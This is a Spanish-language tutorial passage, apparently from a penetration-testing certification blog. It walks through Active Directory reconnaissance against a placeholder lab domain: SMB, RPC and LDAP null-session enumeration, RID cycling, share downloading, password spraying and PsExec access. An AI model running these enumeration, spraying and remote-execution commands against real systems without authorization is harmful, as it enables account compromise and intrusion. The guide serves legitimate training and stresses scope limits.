---
title: "Metodología de Active Directory: del descubrimiento a las rutas de acceso"
description: "Una metodología práctica para enumerar Active Directory, convertir hallazgos en nuevas oportunidades y descubrir rutas de acceso sin depender de un punto de entrada externo."
pubDate: 2026-08-30T12:00:00-06:00
heroImage: '../../../assets/cpts/ad.png'
lang: "es"
category: "CPTS"
---

Esta guía organiza la enumeración de Active Directory para convertir la información disponible en posibles rutas de acceso, en lugar de limitarse a ejecutar comandos sin un objetivo claro.

Está pensada para escenarios en los que **el punto de entrada surge del propio entorno de Active Directory**, sin depender de una aplicación o servicio externo previamente comprometido. La metodología es iterativa: cada usuario, credencial, archivo o permiso descubierto puede abrir nuevas posibilidades de enumeración que debemos validar.

---

## 1. Descubrimiento del dominio

El primer paso es identificar correctamente el dominio y su controlador. Al finalizar esta fase debemos conocer:

- ¿Qué nombre tiene el dominio?
- ¿Cuál es el hostname y el FQDN del controlador de dominio?
- ¿Cuál es el Base DN que utilizaremos en las consultas LDAP?

Estos datos permiten distinguir el hostname, el dominio DNS y el *naming context* de LDAP. También son necesarios porque varias herramientas de Active Directory dependen de que el controlador resuelva correctamente por nombre.

El flujo que seguiremos es el siguiente:

1. Intentar descubrir el hostname y el dominio mediante SMB.
2. Consultar LDAP si SMB no proporciona la información necesaria.
3. Registrar los nombres descubiertos en `/etc/hosts`.
4. Verificar que el controlador de dominio resuelva correctamente.

### 1.1. Descubrir el dominio mediante SMB

Podemos comenzar comprobando si SMB revela información básica del host y del dominio mediante una sesión anónima con NetExec:

```bash
sudo nxc smb <IP> -u '' -p ''
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -u '' -p ''
```

NetExec muestra el hostname y el dominio en líneas separadas:

```text
SMB  192.0.2.10  445  DC01  [*] Windows 10 / Server 2019 Build 17763
SMB  192.0.2.10  445  DC01  [+] lab.example
```

En la columna situada después del puerto aparece el hostname, en este caso `DC01`. La segunda línea muestra el dominio, `lab.example`.

En este punto debemos registrar, como mínimo:

- IP del objetivo: `192.0.2.10`.
- Nombre del host: `DC01`.
- Dominio DNS: `lab.example`.
- Nombre completo del host o FQDN: `dc01.lab.example`.

Que el servidor muestre esta información no implica que permita enumeración anónima adicional. El resultado solo nos ayuda a construir el mapa inicial del entorno.

### 1.2. Alternativa: descubrir el dominio mediante LDAP

Si SMB devuelve `STATUS_NOT_SUPPORTED`, rechaza la sesión anónima o no revela el dominio, podemos consultar el **Root DSE** de LDAP. Esta consulta base puede exponer metadatos del directorio sin necesidad de recorrer sus objetos:

```bash
ldapsearch -x \
  -H ldap://<IP> \
  -s base \
  -b "" \
  dnsHostName \
  defaultNamingContext \
  rootDomainNamingContext \
  namingContexts
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -s base \
  -b "" \
  dnsHostName \
  defaultNamingContext \
  rootDomainNamingContext \
  namingContexts
```

Ejemplo de respuesta:

```text
#
dn:
namingContexts: DC=lab,DC=example
namingContexts: CN=Configuration,DC=lab,DC=example
namingContexts: CN=Schema,CN=Configuration,DC=lab,DC=example
namingContexts: DC=DomainDnsZones,DC=lab,DC=example
namingContexts: DC=ForestDnsZones,DC=lab,DC=example
rootDomainNamingContext: DC=lab,DC=example
defaultNamingContext: DC=lab,DC=example
dnsHostName: dc01.lab.example

# search result
search: 2
result: 0 Success
```

Los atributos principales se interpretan de esta forma:

- `dnsHostName` identifica el FQDN del servidor LDAP.
- `defaultNamingContext` indica la partición predeterminada del dominio.
- `rootDomainNamingContext` identifica el dominio raíz del bosque.
- `namingContexts` enumera las particiones que publica el directorio, incluidas las de configuración, esquema y zonas DNS.
- `result: 0 Success` confirma que la consulta LDAP se completó correctamente.

Si `defaultNamingContext` contiene `DC=lab,DC=example`, podemos traducirlo al dominio DNS `lab.example`. El atributo `dnsHostName` ya nos proporciona el FQDN `dc01.lab.example`. Con ambos valores contamos con la información necesaria para configurar la resolución local.

### 1.3. Registrar los nombres en `/etc/hosts`

Una vez identificados el dominio y el nombre del controlador, **debemos añadirlos a `/etc/hosts` como parte obligatoria de esta metodología**:

```text
192.0.2.10 dc01.lab.example lab.example dc01
```

La entrada sigue este orden:

- Dirección IP del controlador: `192.0.2.10`.
- FQDN del controlador: `dc01.lab.example`.
- Dominio DNS: `lab.example`.
- Hostname: `dc01`.

Este paso no es opcional dentro de nuestro flujo de trabajo. Varios comandos y técnicas posteriores requieren utilizar el dominio o el FQDN del controlador en lugar de comunicarse únicamente con su dirección IP. Si los nombres no se resuelven correctamente, podemos obtener errores de conexión, autenticación o Kerberos aunque el servicio esté disponible.

La entrada de `/etc/hosts` relaciona los nombres descubiertos con la dirección IP del objetivo y nos proporciona una resolución local consistente durante el resto de la metodología. No reemplaza todos los registros que podría ofrecer un servidor DNS, pero nos permite trabajar correctamente con las herramientas que necesitan resolver el FQDN del controlador de dominio.

#### Verificar la resolución

Después de guardar el cambio, comprobamos que el FQDN resuelva hacia la dirección correcta:

```bash
getent hosts <FQDN_DC>
```

Ejemplo:

```bash
getent hosts dc01.lab.example
```

El resultado debe asociar `dc01.lab.example` con `192.0.2.10`. Si no devuelve ninguna entrada o muestra otra dirección, debemos corregir la resolución antes de continuar.

**Resultado de la fase:** IP, dominio, hostname, FQDN y Base DN confirmados, con la resolución mediante `/etc/hosts` funcionando.

---

## 2. Enumeración mediante RPC

Una vez identificado el dominio, podemos comprobar qué información expone mediante RPC. El objetivo principal de esta fase es obtener una **lista de usuarios del dominio**, ya que esas identidades servirán como punto de partida para validaciones posteriores.

El flujo que seguiremos es el siguiente:

1. Intentar establecer una sesión RPC.
2. Enumerar los usuarios del dominio.
3. Ampliar la información de las cuentas encontradas.
4. Consultar grupos y otros recursos disponibles mediante RPC.
5. Utilizar métodos alternativos si la enumeración directa de usuarios es rechazada.

### 2.1. Establecer una sesión RPC

Primero intentamos acceder sin credenciales. Si el servidor no permite una sesión nula y ya contamos con una identidad válida, repetimos la conexión con esas credenciales.

#### Acceso sin credenciales

Primero comprobamos si el servidor acepta una sesión nula, es decir, una conexión sin usuario ni contraseña:

```bash
rpcclient -U "" -N <IP>
```

Ejemplo:

```bash
rpcclient -U "" -N 192.0.2.10
```

Si la conexión se establece, obtendremos una consola interactiva identificada por el prompt `rpcclient $>`. Desde ella podremos ejecutar los comandos de enumeración que el servidor permita.

#### Acceso con credenciales

Cuando ya contamos con una identidad válida, podemos autenticarnos utilizando el formato `[DOMINIO/]USUARIO%CONTRASEÑA`:

```bash
rpcclient -U '<DOMINIO>/<USUARIO>%<CONTRASEÑA>' <IP>
```

Ejemplo:

```bash
rpcclient -U 'LAB/analista%TrainingPass2026' 192.0.2.10
```

Es recomendable encerrar el argumento entre comillas simples para evitar que la shell interprete caracteres especiales de la contraseña.

### 2.2. Enumerar usuarios del dominio

Una vez dentro de la consola de `rpcclient`, ejecutamos:

```text
enumdomusers
```

La salida relaciona cada nombre de usuario con su RID:

```text
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[m.garcia] rid:[0x44f]
```

La cuenta `krbtgt` se crea de forma predeterminada en todos los dominios de Active Directory y es utilizada por el servicio Kerberos. Debemos reconocerla como una cuenta integrada del dominio y no confundirla con una cuenta de usuario convencional.

Si logramos enumerar usuarios, **debemos guardarlos en un archivo llamado `users.txt`, con una cuenta por línea**. No importa si los obtuvimos mediante `enumdomusers`, RID cycling o LDAP: todas las identidades descubiertas deben consolidarse en el mismo archivo.

```text
Administrator
Guest
krbtgt
m.garcia
```

Este archivo se reutilizará en fases posteriores de la metodología. También puede llamarse `users`, pero en esta guía utilizaremos `users.txt` para mantener un nombre consistente.

#### Guardar y limpiar una lista extensa

Si el dominio contiene demasiadas cuentas, podemos ejecutar `enumdomusers` sin entrar en la consola interactiva y guardar el resultado en un archivo:

```bash
rpcclient -U '<DOMINIO>/<USUARIO>%<CONTRASEÑA>' <IP> \
  -c 'enumdomusers' | tee rpc_users_raw.txt
```

Ejemplo:

```bash
rpcclient -U 'LAB/analista%TrainingPass2026' 192.0.2.10 \
  -c 'enumdomusers' | tee rpc_users_raw.txt
```

Después extraemos solamente los nombres de usuario:

```bash
awk -F'[][]' '/user:\[/ {print $2}' rpc_users_raw.txt > users.txt
```

El archivo `rpc_users_raw.txt` conserva la salida original, mientras que `users.txt` contiene una identidad por línea y queda preparado para las siguientes fases.

### 2.3. Ampliar la información de los usuarios

La lista inicial nos indica qué cuentas existen. El siguiente paso es buscar nombres completos, descripciones y otros datos que nos ayuden a entender la función de cada identidad.

#### Consultar un usuario mediante su RID

```text
queryuser <RID>
```

Ejemplo:

```text
queryuser 0x44f
```

La consulta puede mostrar datos como el nombre de la cuenta, nombre completo, descripción y otros atributos publicados mediante RPC.

#### Consultar información de varias cuentas

```text
querydispinfo
```

Este comando resulta útil para revisar varias cuentas junto con sus nombres completos y comentarios. Las descripciones pueden revelar la función de una cuenta o indicar que pertenece a un servicio.

### 2.4. Enumerar otros recursos mediante RPC

Después de trabajar con los usuarios, aprovechamos la misma sesión para consultar otros elementos del dominio y del servidor.

#### Enumerar grupos del dominio

```text
enumdomgroups
```

Este comando devuelve los grupos y sus RID. Sus nombres pueden ayudarnos a identificar funciones administrativas, equipos internos o cuentas relacionadas con servicios.

#### Enumerar recursos compartidos

```text
netshareenum
```

La disponibilidad de un recurso compartido no implica que podamos leerlo o modificarlo. En una fase posterior tendremos que validar sus permisos con la identidad que estemos utilizando.

#### Consultar información general del servidor

```text
srvinfo
```

Puede devolver el nombre del servidor, plataforma, versión y otros datos generales del sistema.

### 2.5. Alternativas para enumerar usuarios

No todos los servidores permiten ejecutar `enumdomusers` mediante una sesión nula. Si recibimos `NT_STATUS_ACCESS_DENIED`, seguimos este orden:

1. Si tenemos credenciales, repetimos `enumdomusers` con el usuario autenticado.
2. Comprobamos si es posible resolver cuentas mediante RID cycling.
3. Probamos la enumeración de usuarios por LDAP con NetExec.

El acceso denegado debe quedar registrado. Si más adelante obtenemos una identidad nueva, regresamos a RPC y repetimos las consultas, porque esa cuenta puede tener permisos que la sesión anterior no tenía.

#### Alternativa 1: RID cycling

Aunque `enumdomusers` esté restringido, en algunos entornos todavía es posible consultar el SID del dominio y resolver una secuencia de RID. Esta técnica suele denominarse **RID cycling** y no consiste en probar contraseñas.

Primero solicitamos información de la política local mediante `lsaquery`:

```bash
rpcclient -U '<USUARIO>%' <IP> -c 'lsaquery'
```

Ejemplo:

```bash
rpcclient -U 'guest%' 192.0.2.10 -c 'lsaquery'
```

La respuesta puede incluir el SID del dominio:

```text
Domain Sid: S-1-5-21-1111111111-2222222222-3333333333
```

Con el SID identificado, podemos consultar un rango de RID y descartar las respuestas que no correspondan a objetos conocidos:

```bash
seq 400 2000 | xargs -P 50 -I {} \
  rpcclient -U '<USUARIO>%' <IP> \
  -c 'lookupsids <SID_DOMINIO>-{}' | grep -v unknown
```

Ejemplo:

```bash
seq 400 2000 | xargs -P 50 -I {} \
  rpcclient -U 'guest%' 192.0.2.10 \
  -c 'lookupsids S-1-5-21-1111111111-2222222222-3333333333-{}' | grep -v unknown
```

La salida puede contener usuarios, grupos y otras cuentas asociadas a los RID resueltos. Debemos conservar el tipo de objeto junto con su nombre en lugar de asumir que todos los resultados representan usuarios.

#### Alternativa 2: NetExec mediante LDAP

Esta alternativa no utiliza RPC. Consulta LDAP mediante NetExec para intentar obtener la lista de usuarios. Con credenciales, la sintaxis base es:

```bash
nxc ldap <IP_DC> -d <DOMINIO> -u '<USUARIO>' -p '<CONTRASEÑA>' --users
```

Ejemplo:

```bash
nxc ldap 192.0.2.10 -d lab.example -u 'analista' -p 'TrainingPass2026' --users
```

Si todavía no tenemos credenciales, comprobamos si LDAP permite la consulta anónima:

```bash
nxc ldap <IP_DC> -d <DOMINIO> -u '' -p '' --users
```

Ejemplo:

```bash
nxc ldap 192.0.2.10 -d lab.example -u '' -p '' --users
```

Si LDAP rechaza la consulta anónima, registramos el resultado y la repetimos cuando obtengamos credenciales válidas.

**Resultado de la fase:** `users.txt` actualizado y los RID, grupos o descripciones relevantes asociados a cada cuenta.

---

## 3. Enumeración mediante SMB

En esta fase buscamos identificar los recursos compartidos publicados por el servidor y determinar qué puede hacer nuestra identidad sobre cada uno. No basta con conocer el nombre de un share: debemos comprobar si tenemos permisos de **lectura**, **escritura** o ambos.

El flujo que seguiremos es el siguiente:

1. Enumerar shares sin credenciales y con la cuenta `guest`.
2. Repetir la enumeración con cada credencial válida que obtengamos.
3. Clasificar los permisos de cada share.
4. Inspeccionar y descargar la información accesible mediante lectura.
5. Evaluar con cuidado las posibilidades que abre un permiso de escritura.
6. Registrar los resultados y volver a enumerar cuando consigamos otra identidad.

### 3.1. Enumerar shares sin credenciales

Primero comprobamos si el servidor permite listar recursos compartidos mediante una sesión nula.

#### NetExec con usuario vacío

```bash
sudo nxc smb <IP> -u '' -p '' --shares
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -u '' -p '' --shares
```

#### NetExec con la cuenta `guest`

Una sesión nula puede estar bloqueada mientras que la cuenta `guest` todavía permite acceder a ciertos recursos. Por eso debemos probar ambas variantes:

```bash
sudo nxc smb <IP> -u 'guest' -p '' --shares
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -u 'guest' -p '' --shares
```

Si una variante falla, no debemos asumir que SMB está completamente restringido. El servidor puede tratar de forma diferente una sesión nula, una cuenta `guest` explícita o un nombre de usuario que termine mapeado como invitado.

#### Alternativas con `smbclient` y `smbmap`

Las herramientas pueden comportarse de forma distinta frente a la misma configuración, por lo que conviene contrastar el resultado de NetExec.

Listar shares con `smbclient` sin solicitar contraseña:

```bash
smbclient -L //<IP> -N
```

Ejemplo:

```bash
smbclient -L //192.0.2.10 -N
```

Probar la cuenta `guest` con `smbmap`:

```bash
smbmap -H <IP> -u 'guest' -p ''
```

Ejemplo:

```bash
smbmap -H 192.0.2.10 -u 'guest' -p ''
```

### 3.2. Enumerar shares con credenciales

Cuando obtengamos una credencial válida, debemos repetir la enumeración. Un usuario autenticado puede ver shares que no se publican para sesiones anónimas y puede tener permisos diferentes sobre recursos ya conocidos.

#### NetExec con usuario y contraseña

```bash
sudo nxc smb <IP> -d <DOMINIO> -u '<USUARIO>' -p '<CONTRASEÑA>' --shares
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -d lab.example -u 'analista' -p 'TrainingPass2026' --shares
```

Si una contraseña comienza con un guion, podemos utilizar la forma larga del argumento para evitar que se interprete como otra opción:

```bash
sudo nxc smb <IP> -d <DOMINIO> -u '<USUARIO>' -p='<CONTRASEÑA>' --shares
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -d lab.example -u 'analista' -p='-TrainingPass2026!' --shares
```

#### `smbclient` con credenciales

Para listar los shares disponibles:

```bash
smbclient -L //<IP> -U '<DOMINIO>/<USUARIO>'
```

Ejemplo:

```bash
smbclient -L //192.0.2.10 -U 'LAB/analista'
```

El programa solicitará la contraseña de forma interactiva, evitando dejarla escrita directamente en el comando.

#### NetExec con Kerberos

Si NTLM está deshabilitado o el entorno requiere Kerberos, utilizamos el FQDN que configuramos en `/etc/hosts` durante la primera fase:

```bash
sudo nxc smb <FQDN_DC> -d <DOMINIO> -u '<USUARIO>' -p '<CONTRASEÑA>' -k --shares
```

Ejemplo:

```bash
sudo nxc smb dc01.lab.example -d lab.example -u 'analista' -p 'TrainingPass2026' -k --shares
```

Kerberos depende de una resolución de nombres correcta y de que la hora de nuestro equipo esté sincronizada con el dominio. Si cualquiera de estas condiciones falla, una credencial válida puede producir errores de autenticación.

### 3.3. Interpretar los permisos de los shares

La salida de NetExec puede indicar permisos como `READ` o `WRITE` para cada recurso:

```text
Share        Permissions     Remark
-----        -----------     ------
Public       READ            Shared documents
Department   READ,WRITE      Department exchange
```

Debemos interpretar esos permisos como capacidades distintas.

#### Permiso de lectura

Con `READ` podemos listar directorios y descargar archivos. El objetivo es buscar información que nos ayude a continuar la cadena de ataque, por ejemplo:

- Archivos de configuración.
- Scripts y tareas de administración.
- Backups.
- Documentación interna.
- Nombres de usuarios o equipos.
- Contraseñas, claves o referencias a otros servicios.
- Cualquier dato que aporte una nueva pista sobre el entorno.

Si encontramos nombres de usuario que no estaban en el inventario de la fase 2, los incorporamos al archivo `users.txt` existente. No debemos crear una lista independiente para SMB.

#### Permiso de escritura

`WRITE` indica que podemos crear o modificar contenido dentro del share. Dependiendo de cómo utilicen ese recurso los usuarios o sistemas del dominio, este permiso puede abrir caminos como:

- Captura de hashes mediante referencias a recursos controlados durante una evaluación autorizada.
- Modificación de scripts o archivos consumidos por otros usuarios.
- Abuso de carpetas utilizadas para despliegues, tareas o procesos automatizados.
- Sustitución de archivos cuando el flujo del entorno confía en el contenido del share.

El permiso de escritura no implica automáticamente que alguna de estas técnicas vaya a funcionar. Primero debemos entender quién consume el recurso, desde qué sistema y con qué privilegios. Además, escribir o modificar archivos cambia el entorno, por lo que solo debe hacerse si el alcance de la evaluación lo permite.

### 3.4. Acceder y revisar un share

#### Acceso sin credenciales

```bash
smbclient --no-pass //<IP>/<SHARE>
```

Ejemplo:

```bash
smbclient --no-pass //192.0.2.10/Public
```

#### Acceso con credenciales

```bash
smbclient //<IP>/<SHARE> -U '<DOMINIO>/<USUARIO>'
```

Ejemplo:

```bash
smbclient //192.0.2.10/Department -U 'LAB/analista'
```

Si el nombre del recurso contiene espacios, encerramos la ruta completa entre comillas:

```bash
smbclient '//<IP>/<SHARE CON ESPACIOS>' -U '<DOMINIO>/<USUARIO>'
```

Ejemplo:

```bash
smbclient '//192.0.2.10/Accounting Department' -U 'LAB/analista'
```

#### Descargar un archivo

Dentro de la consola de `smbclient` podemos utilizar `ls` para listar el contenido y `get` para descargar un archivo:

```text
ls
get <ARCHIVO>
```

Ejemplo:

```text
get deployment-notes.txt
```

#### Descargar el contenido de forma recursiva

Antes de una descarga masiva conviene trabajar desde un directorio local dedicado para no mezclar archivos de distintos shares. Dentro de `smbclient` ejecutamos:

```text
mask ""
prompt OFF
recurse ON
mget *
```

La salida original de la herramienta y los archivos descargados deben conservarse por separado. Esto facilita volver a revisar el contenido sin repetir la conexión.

#### Revisar archivos con Alternate Data Streams

Si un archivo parece vacío o su tamaño no coincide con lo esperado, podemos comprobar si contiene metadatos o un **Alternate Data Stream (ADS)**:

```text
allinfo "<ARCHIVO>"
```

Ejemplo:

```text
allinfo "Debug Mode Password.txt"
```

Si necesitamos conocer su nombre corto:

```text
altname "<ARCHIVO>"
```

Ejemplo:

```text
altname "Debug Mode Password.txt"
```

La respuesta puede devolver un nombre como:

```text
DEBUGM~1.TXT
```

Cuando `allinfo` confirme la existencia de un stream, podemos descargarlo especificando su nombre completo:

```text
get <NOMBRE_CORTO>:<STREAM>:$DATA
```

Ejemplo:

```text
get DEBUGM~1.TXT:Password:$DATA
```

Una vez descargado, revisamos el archivo local con las herramientas habituales del sistema.

### 3.5. Validar un permiso de escritura

Para entrar al recurso utilizamos el mismo comando de acceso autenticado:

```bash
smbclient //<IP>/<SHARE> -U '<DOMINIO>/<USUARIO>'
```

Ejemplo:

```bash
smbclient //192.0.2.10/Department -U 'LAB/analista'
```

Dentro de `smbclient`, podemos validar el permiso subiendo un archivo de prueba autorizado:

```text
put <ARCHIVO_LOCAL> <NOMBRE_REMOTO>
```

Ejemplo:

```text
put write-test.txt write-test.txt
```

La prueba debe ser controlada, claramente identificable y permitida por el alcance. Una vez confirmada la escritura, documentamos qué identidad, ruta y archivo se utilizaron antes de evaluar cualquier técnica adicional.

### 3.6. Incorporar nuevos usuarios al inventario

SMB también puede revelar usuarios mediante una cuenta autenticada:

```bash
sudo nxc smb <IP> -d <DOMINIO> -u '<USUARIO>' -p '<CONTRASEÑA>' --users
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -d lab.example -u 'analista' -p 'TrainingPass2026' --users
```

Cuando el servidor permite resolver RID mediante SMB, NetExec ofrece otra forma de obtener identidades:

```bash
nxc smb <IP> -u 'guest' -p '' --rid-brute
```

Ejemplo:

```bash
nxc smb 192.0.2.10 -u 'guest' -p '' --rid-brute
```

La metodología para organizar usuarios ya fue definida en la fase 2. Si estos comandos descubren cuentas nuevas, las añadimos a `users.txt`, eliminamos duplicados y continuamos trabajando con un único inventario.

### 3.7. Validar credenciales y privilegios

NetExec permite comprobar si una credencial es válida para SMB:

```bash
sudo nxc smb <IP> -d <DOMINIO> -u '<USUARIO>' -p '<CONTRASEÑA>'
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -d lab.example -u 'analista' -p 'TrainingPass2026'
```

Una respuesta que incluya `Pwn3d!` indica que NetExec considera que la cuenta probablemente posee privilegios administrativos locales y capacidad de ejecución sobre el objetivo. Ese resultado no significa que debamos ejecutar inmediatamente una herramienta de acceso remoto: primero lo documentamos y confirmamos que la acción está permitida por el alcance.

Si la cuenta es administrativa y el acceso remoto está autorizado, la sintaxis de Impacket PsExec es:

```bash
impacket-psexec '<DOMINIO>/<USUARIO>:<CONTRASEÑA>@<IP>'
```

Ejemplo:

```bash
impacket-psexec 'LAB/administrator:TrainingPass2026@192.0.2.10'
```

WinRM es un servicio distinto de SMB, pero una credencial descubierta durante esta fase también puede validarse contra él:

```bash
nxc winrm <IP> -d <DOMINIO> -u '<USUARIO>' -p '<CONTRASEÑA>'
```

Ejemplo:

```bash
nxc winrm 192.0.2.10 -d lab.example -u 'analista' -p 'TrainingPass2026'
```

### 3.8. Validar varias credenciales de forma controlada

Si contamos con archivos de usuarios y contraseñas, NetExec puede comprobarlos y continuar después de encontrar una coincidencia:

```bash
sudo nxc smb <IP> -u users.txt -p passwords.txt --continue-on-success
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -u users.txt -p passwords.txt --continue-on-success
```

Antes de realizar pruebas con varias cuentas debemos revisar la política de bloqueo del dominio y respetar los límites definidos para la evaluación.

Para comprobar la mala práctica de utilizar el mismo nombre como usuario y contraseña, podemos pasar el archivo `users.txt` en ambas posiciones y emparejar las entradas por línea:

```bash
sudo nxc smb <IP> -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

Ejemplo:

```bash
sudo nxc smb 192.0.2.10 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```

### 3.9. Gestionar `STATUS_PASSWORD_MUST_CHANGE`

En ocasiones una credencial válida devuelve el estado `STATUS_PASSWORD_MUST_CHANGE`. Esto significa que la cuenta debe cambiar su contraseña antes de poder autenticarse normalmente.

El cambio de contraseña modifica la cuenta y puede afectar a su propietario o a servicios que dependan de ella. Solo debemos realizarlo cuando esté expresamente permitido y después de documentar el estado original.

La sintaxis base es:

```bash
impacket-changepasswd '<DOMINIO>/<USUARIO>:<CONTRASEÑA_ACTUAL>@<IP>' \
  -newpass '<CONTRASEÑA_NUEVA>'
```

Si la contraseña actual está vacía:

```bash
impacket-changepasswd '<DOMINIO>/<USUARIO>:@<IP>' \
  -newpass '<CONTRASEÑA_NUEVA>'
```

Ejemplo:

```bash
impacket-changepasswd 'LAB/analista:@192.0.2.10' \
  -newpass 'NewTrainingPass2026!'
```

Después del cambio, debemos validar la nueva credencial, registrar el resultado y utilizarla con cuidado en las siguientes consultas.

**Resultado de la fase:** matriz de usuario, share y permiso (`READ` o `WRITE`), junto con cualquier archivo o pista que permita continuar la cadena.

---

## 4. Enumeración mediante LDAP

LDAP nos permite consultar la estructura de Active Directory y las relaciones entre sus objetos. Su potencial va mucho más allá de obtener usuarios: puede revelar grupos, equipos, unidades organizativas, cuentas de servicio, GPO, relaciones de confianza, configuraciones de delegación, permisos, atributos sensibles y objetos eliminados.

El flujo que seguiremos es el siguiente:

1. Reutilizar el Base DN obtenido durante el descubrimiento del dominio.
2. Comprobar si el directorio permite consultas anónimas.
3. Repetir la enumeración con cada credencial válida.
4. Utilizar StartTLS o LDAPS cuando el entorno lo requiera.
5. Pasar del volcado general a consultas dirigidas por tipo de objeto.
6. Revisar objetos eliminados, permisos y atributos protegidos cuando nuestra identidad pueda acceder a ellos.
7. Guardar la salida original y actualizar los inventarios existentes.

### 4.1. Preparar la consulta

En la fase 1 obtuvimos valores como los siguientes:

```text
Dominio DNS: lab.example
Base DN: DC=lab,DC=example
FQDN del DC: dc01.lab.example
```

El Base DN define desde qué punto del directorio comenzará la búsqueda. Debemos reutilizar el valor real entregado por `defaultNamingContext` en lugar de reconstruirlo manualmente cada vez.

### 4.2. Enumerar LDAP sin credenciales

Primero intentamos un bind anónimo sobre el Base DN del dominio:

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '' \
  -w '' \
  -b '<BASE_DN>'
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D '' \
  -w '' \
  -b 'DC=lab,DC=example'
```

Si la consulta devuelve objetos, guardamos la salida completa antes de aplicar filtros:

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '' \
  -w '' \
  -b '<BASE_DN>' | tee ldap_anonymous.ldif
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D '' \
  -w '' \
  -b 'DC=lab,DC=example' | tee ldap_anonymous.ldif
```

Que el Root DSE sea accesible no significa que el contenido del dominio también lo sea. Si recibimos `Operations error`, `Insufficient access` o una respuesta vacía, registramos el resultado y continuamos con una identidad autenticada.

### 4.3. Enumerar LDAP con credenciales

La forma recomendada es utilizar el UPN del usuario y `-W`, para que `ldapsearch` solicite la contraseña sin dejarla expuesta en el historial:

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>'
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example'
```

También puede utilizarse el formato NetBIOS `DOMINIO\usuario`:

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<DOMINIO_NETBIOS>\<USUARIO>' \
  -W \
  -b '<BASE_DN>'
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'LAB\analista' \
  -W \
  -b 'DC=lab,DC=example'
```

En un laboratorio también podemos proporcionar la contraseña con `-w`, aunque quedará visible en el comando:

```bash
ldapsearch -x \
  -H ldap://<IP_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -w '<CONTRASEÑA>' \
  -b '<BASE_DN>'
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldap://192.0.2.10 \
  -D 'analista@lab.example' \
  -w 'TrainingPass2026' \
  -b 'DC=lab,DC=example'
```

Cada credencial nueva puede ver atributos u objetos que estaban ocultos para la sesión anónima. Por eso debemos repetir las consultas relevantes desde la perspectiva de cada identidad.

### 4.4. Utilizar StartTLS o LDAPS

Cuando el servidor exige una conexión protegida, podemos solicitar StartTLS sobre LDAP mediante `-ZZ`:

```bash
ldapsearch -x -ZZ \
  -H ldap://<FQDN_DC> \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>'
```

Ejemplo:

```bash
ldapsearch -x -ZZ \
  -H ldap://dc01.lab.example \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example'
```

Si el servicio publica LDAPS, utilizamos el esquema `ldaps://`:

```bash
ldapsearch -x \
  -H ldaps://<FQDN_DC>:636 \
  -D '<USUARIO>@<DOMINIO>' \
  -W \
  -b '<BASE_DN>'
```

Ejemplo:

```bash
ldapsearch -x \
  -H ldaps://dc01.lab.example:636 \
  -D 'analista@lab.example' \
  -W \
  -b 'DC=lab,DC=example'
```

#### Certificado no confiable en un laboratorio

Si StartTLS funciona pero el certificado no pertenece a una autoridad confiable para nuestro equipo, podemos desactivar temporalmente su validación:

```bash
LDAPTLS_REQCERT=never ldapsearch -x -ZZ \
  -H ldap://<FQDN_DC> \
  -D '<DOMINIO_NETBIOS>\<USUARIO>' \
  -w '<CONTRASEÑA>' \
  -b '<BASE_DN>'
```

Ejemplo:

```bash
LDAPTLS_REQCERT=never ldapsearch -x -ZZ \
  -H ldap://dc01.lab.example \
  -D 'LAB\analista' \
  -w 'TrainingPass2026' \
  -b 'DC=lab,DC=example'
```

`LDAPTLS_REQCERT=never` desactiva la verificación de identidad del servidor y facilita ataques de intermediario. Debe limitarse a laboratorios controlados; en una evaluación real es preferible confiar correctamente en la CA del entorno.

### 4.5. Entender qué puede revelar LDAP

Antes de lanzar filtros aislados, conviene entender qué aporta cada familia de objetos:

| Objetivo | Información que puede revelar |
| --- | --- |
| Usuarios | Nombres, descripciones, grupos, flags de cuenta, rutas de perfil y datos de contacto. |
| Grupos | Miembros, grupos anidados y funciones administrativas o internas. |
| Equipos | Hostname, sistema operativo, SPN y ubicación dentro de una OU. |
| Cuentas de servicio | SPN, descripciones y relaciones con servicios del dominio. |
| OU | Estructura administrativa, objetos contenidos, delegaciones y enlaces `gPLink`. |
| GPO | Políticas aplicadas, configuraciones y rutas de SYSVOL. |
| Política del dominio | Longitud mínima de contraseña, bloqueo de cuentas y otros valores generales. |
| Trusts | Dominios relacionados, dirección y atributos de la relación de confianza. |
| Delegaciones y ACL | Identidades con control sobre usuarios, grupos, equipos u otros objetos. |
| DNS integrado en AD | Zonas y registros almacenados en `DomainDnsZones` o `ForestDnsZones`. |
| Configuración y AD CS | Autoridades certificadoras, servicios de inscripción y plantillas cuando AD CS está desplegado. |
| Atributos protegidos | Contraseñas de LAPS, datos de gMSA u otra información visible solo para identidades autorizadas. |
| Objetos eliminados | Tombstones con parte de los atributos y la ubicación anterior del objeto. |

LDAP no explota estos objetos por sí mismo. Nos ayuda a construir el mapa de identidades, configuraciones y relaciones que utilizaremos para decidir el siguiente paso.

### 4.6. Realizar consultas dirigidas

Los filtros LDAP reducen el ruido y permiten solicitar solo los atributos que necesitamos.

